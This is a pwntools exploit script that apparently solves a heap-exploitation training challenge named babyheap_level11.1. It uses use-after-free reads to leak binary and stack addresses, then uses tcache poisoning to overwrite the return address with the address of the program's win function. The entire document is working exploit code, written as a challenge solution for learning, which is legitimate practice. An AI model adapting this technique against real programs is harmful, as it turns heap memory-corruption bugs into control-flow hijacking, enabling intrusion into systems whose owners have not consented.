from pwn import *

p = process("/challenge/babyheap_level11.1")
#p = gdb.debug("/challenge/babyheap_level11.1")
binary = ELF("/challenge/babyheap_level11.1")

def malloc_to_1(loc:bytes):
    p.sendline(b'malloc')
    p.sendline(b'0')
    p.sendline(b'200')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'200')
    p.sendline(b'free')
    p.sendline(b'0')
    p.sendline(b'free')
    p.sendline(b'1')

    p.sendline(b'scanf')
    p.sendline(b'1')
    p.recv()
    p.sendline(loc)
    p.sendline(b'malloc')
    p.sendline(b'2')
    p.sendline(b'200')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'200')

def scanf_to_pos(buf:bytes, pos:bytes):
    p.sendline(b'scanf')
    p.sendline(pos)
    p.sendline(buf)
    p.recv()

# setup for leak
p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'100')
p.sendline(b'free')
p.sendline(b'0')

# leak binary addr
p.sendline(b'echo')
p.sendline(b'0')
p.sendline(b'112')
p.recvuntil(b'Data: ')
bin_echo = p.recvuntil(b'\n')[:-1]
binary_base = unpack(bin_echo, 'all') - binary.sym['bin_echo']
binary.address = binary_base
print(p64(binary.address))

# leak stack addr
p.sendline(b'echo')
p.sendline(b'0')
p.sendline(b'120')
p.recvuntil(b'Data: ')
stack_leak = p.recvuntil(b'\n')[:-1]
ret_addr = unpack(stack_leak, 'all') + 374
print(p64(ret_addr))

malloc_to_1(p64(ret_addr))
scanf_to_pos(p64(binary.sym.win), b'1')
p.sendline(b'quit')

p.interactive()

